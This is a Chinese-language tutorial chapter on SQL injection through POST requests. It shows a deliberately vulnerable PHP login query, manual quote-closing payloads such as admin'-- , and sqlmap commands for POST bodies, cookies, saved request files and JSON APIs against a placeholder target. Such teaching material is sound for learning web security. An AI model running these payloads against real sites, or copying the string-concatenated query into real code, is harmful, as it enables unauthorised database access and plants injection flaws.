# 05 POST 注入

> GET 把参数放在 URL 里，POST 放在请求体里。闭合判断的思路完全一样，区别只在**怎么把 payload 发过去**。

## 5.1 有漏洞的登录逻辑

```php
$uname = $_POST['username'];
$upass = $_POST['password'];

$sql = "select id, username, password from users
        where username='$uname' and password='$upass' limit 0,1";
```

两个参数都拼进 SQL，等于**两个注入点**。通常从 `username` 下手。

## 5.2 手工验证闭合

正常请求：

```
POST /login.php
username=admin&password=admin&submit=Submit
```

测试闭合时把 `username` 改成：

```
username=admin'&password=admin&submit=Submit
```

如果页面报错 → 单引号闭合。再试 `admin'--+`（在 POST 里 `+` 不是空格，要写成 `admin'-- ` 或 `admin'#`）：

```
username=admin'-- &password=admin&submit=Submit
```

> **关键区别**：`+` 只有在 URL 查询字符串里才被解码成空格。POST body 里的 `+` 是字面加号，注释会失效。
> 也可以把整个 body 做 URL 编码后再发，`+` 就仍然可用。

## 5.3 用 sqlmap 打 POST

```bash
sqlmap -u "http://target/login.php" \
  --data "uname=admin1*&passwd=admin1&submit=Submit" \
  --current-db --batch --threads 10 --technique U
```

参数说明：

| 参数 | 含义 |
| --- | --- |
| `-u` | 目标 URL（POST 时通常就是表单提交的地址） |
| `--data` | POST 的请求体内容 |
| `*` | **标记注入点**：星号打在哪，就让 sqlmap 打哪 |
| `--current-db` | 只取当前数据库名 |
| `--batch` | 全部用默认回答，不交互 |
| `--threads 10` | 10 个线程并发 |
| `--technique U` | 只用 union 联合查询 |

要点：`--data` 里如果只有一个参数不确定是哪个，就两个都试；`*` 放在哪个值后面，sqlmap 就只对那个参数做注入测试。

## 5.4 带 Cookie / 登录态的场景

后台功能一般都要登录，直接带 Cookie：

```bash
sqlmap -u "http://target/admin.php?id=1" \
  --cookie "PHPSESSID=abcdef123456; role=admin" \
  --dbs --batch
```

或把整个请求存成文件再读：

```bash
sqlmap -r request.txt --batch --dbs
```

`request.txt` 就是浏览器开发者工具 → Network → 右键请求 → Copy as cURL，或直接存原始请求头。

## 5.5 JSON 与其他格式

```bash
# JSON body
sqlmap -u "http://target/api/user" \
  --data '{"id":"1*"}' --headers "Content-Type: application/json" --batch

# 表单 + 自定义 UA
sqlmap -u "http://target/login.php" \
  --data "user=a*&pass=b" \
  --user-agent "Mozilla/5.0 ..." --batch
```

## 5.6 小结

| GET | POST |
| --- | --- |
| 参数在 URL | 参数在 body |
| `+` = 空格，`--+` 可用 | `+` 是字面加号，用 `-- ` 或 `#` |
| `sqlmap -u "url?id=1*"` | `sqlmap -u "url" --data "id=1*"` |

闭合方式、字段数、回显位的判断逻辑，两种请求完全一致。
